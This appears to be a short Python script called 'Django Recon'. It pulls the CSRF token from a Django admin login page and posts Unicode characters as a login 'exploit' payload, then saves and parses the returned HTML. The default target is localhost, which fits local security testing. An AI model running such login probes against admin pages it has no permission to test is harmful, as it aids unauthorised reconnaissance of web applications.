#
# Django Recon
#
# Henry Samuelson 11/29/18

# This is built to work assuming server is running on localhost

import requests
from bs4 import BeautifulSoup

def ui():
    #system('cls')
    print("DJango Recon")
    input1 = str(raw_input("Target Admin page url (str)> "))
    requestPage(input1)
    pass


def requestPage(url = "http://localhost:8000/admin/login/?next=/admin/"):
    assert type(url) == str
    
    # Start Session
    client = requests.session() 

    # Gets CSRF token from returned HTML
    page = client.get(url, auth=('user', 'pass'))
    page = page.text
    page = page[page.find('value'):] # Search for CSRF
    token = str(page[7:page.find('"', 7)]) # Get CSRF


    # Payload with Unicode Exploit
    payload = {'username': '漢', 'password': '漢' , "csrfmiddlewaretoken":token}
    page = client.post(url, data = payload)
    print(page.text) # Another option is r = r.json()
    file = open("outputer.html", "w")
    file.write(str(page.text))
    return page.text

def parseHTML(html_doc, file = False):
    """
    Takes html str

    Returns: str, all text inside of html document
    """
    # Ensures that URL is String
    assert type(html_doc) == str

    if(file == True): # Does the file exist?
        contents = open(html_doc, 'r')
        html_doc = contents.read()
        contents.close()
    return BeautifulSoup(html_doc, 'html.parser')
    #fileContents = BeautifulSoup(html_doc, 'html.parser')
    #return fileContents.get_text()

def textOfInterest(soup):
    contents = []
    for line in soup.get_text().split('\n'):
        if(line != ''):
            temp = line.split()
            temp =  str(temp)[1:len(str(temp))-1]
            contents.append(temp)

    fContent = [] #this will be in an ordered method:  [header-1, contents-1, header-n,contents-n]
    for i in range(1, len(contents)):
        if(contents[i].isupper()):
            # Add this line and line below it.
            fContent.append(contents[i])
            fContent.append(contents[i+1])

    return fContent

requestPage()
